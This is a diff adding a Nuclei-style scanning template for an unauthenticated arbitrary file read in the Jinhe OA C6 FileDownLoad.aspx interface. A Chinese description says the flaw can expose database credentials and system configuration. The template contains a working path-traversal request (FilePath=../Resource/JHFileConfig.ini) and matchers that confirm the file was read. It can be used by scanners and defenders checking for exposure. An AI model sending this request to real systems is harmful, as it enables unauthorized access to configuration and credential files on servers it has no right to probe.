@@ -1,0 +1,28 @@
+id: jinheOA-C6-FileDownLoad-File-reading
+
+info:
+  name: "金和OA C6 FileDownLoad.aspx 未授权任意文件读取漏洞"
+  author: Unknown
+  severity: medium
+  description: 金和OA C6系统中的FileDownLoad.aspx接口存在访问控制缺陷，攻击者可通过构造特定请求参数绕过身份验证机制，实现对受限文件的非授权访问。该漏洞允许读取关键系统文件（包括但不限于数据库配置文件、系统配置文件等敏感资源），可能导致数据库凭证泄露、系统架构暴露等高危风险，严重威胁系统整体安全性。
+  tags: 金和OA
+
+http:
+- raw:
+  - |
+    GET /c6/JHSoft.Web.CustomQuery/FileDownLoad.aspx?FilePath=../Resource/JHFileConfig.ini HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '[JHFile]'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
